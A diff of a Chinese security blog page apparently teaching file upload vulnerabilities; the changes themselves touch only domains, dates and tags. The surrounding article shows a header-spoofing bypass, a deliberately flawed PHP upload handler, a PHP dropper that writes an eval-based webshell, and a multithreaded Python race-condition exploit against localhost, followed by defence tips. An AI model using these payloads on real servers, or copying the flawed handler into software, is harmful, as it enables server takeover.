@@ -16,12 +16,12 @@
 <meta property="og:site_name" content="Sdwang1的博客">
 <meta property="og:description" content="前言文件上传漏洞，是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。它是指 由于服务器对于用户上传部分的控制不严格（缺少必要的校验），导致攻击者可以直接或者通过各种绕过方式将恶意的webshell上传到服务器，进而执行利用。首先看一段PHP代码，假设对于上传的文件可在/var/www/hackable/uploads/目录下找到：1234567891011121314151617">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://www.sdwangblog.cn/blogimg/upload_file_competition_vulnerability.png">
-<meta property="og:updated_time" content="2019-03-07T01:44:29.175Z">
+<meta property="og:image" content="http://www.sdwangblog.top/blogimg/upload_file_competition_vulnerability.png">
+<meta property="og:updated_time" content="2023-06-20T06:37:17.999Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="简单粗暴的文件上传漏洞">
 <meta name="twitter:description" content="前言文件上传漏洞，是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。它是指 由于服务器对于用户上传部分的控制不严格（缺少必要的校验），导致攻击者可以直接或者通过各种绕过方式将恶意的webshell上传到服务器，进而执行利用。首先看一段PHP代码，假设对于上传的文件可在/var/www/hackable/uploads/目录下找到：1234567891011121314151617">
-<meta name="twitter:image" content="http://www.sdwangblog.cn/blogimg/upload_file_competition_vulnerability.png">
+<meta name="twitter:image" content="http://www.sdwangblog.top/blogimg/upload_file_competition_vulnerability.png">
   
     <link rel="alternative" href="/atom.xml" title="Sdwang1的博客" type="application/atom+xml">
   
@@ -195,7 +195,7 @@
 <p><strong>服务端检测文件头</strong>，因为不同的图片文件都有不同文件头，如PNG文件头标识8bytes——89 50 4E 47 0D 0A 1A 0A，JPEG文件头标识2bytes——0xff, 0xd8 ，有些开发者会想采用这种验证方式。<strong>绕过姿势：只需要在恶意脚本前加上允许上传文件的头标识就可以了</strong>，类似于<code>GIF89a  &lt;?php phpinfo(); ?&gt;</code>。</p>
 <h3 id="上传到服务器端后验证——竞争上传"><a href="#上传到服务器端后验证——竞争上传" class="headerlink" title="上传到服务器端后验证——竞争上传"></a>上传到服务器端后验证——竞争上传</h3><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，<a href="https://paper.seebug.org/560/" target="_blank" rel="noopener">演示代码</a>如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>利用思路是，首先上传一个PHP文件，内容为<code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code>，当然这个文件会立刻被删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure></p>
-<p>经过几次尝试后成功成功写入shell：<br><img src="http://www.sdwangblog.cn/blogimg/upload_file_competition_vulnerability.png" alt></p>
+<p>经过几次尝试后成功成功写入shell：<br><img src="http://www.sdwangblog.top/blogimg/upload_file_competition_vulnerability.png" alt></p>
 <h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><ul>
 <li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）；</li>
 <li>验证文件内容，使用正则匹配限制恶意代码上传；</li>
@@ -388,7 +388,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 Shudan Wang
+    		&copy; 2023 Shudan Wang
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -519,10 +519,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Apache</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Git</a>
               </li>
              
@@ -535,15 +531,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Apache</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">HTML</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Nginx</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
               </li>
              
               <li class="article-tag-list-item">
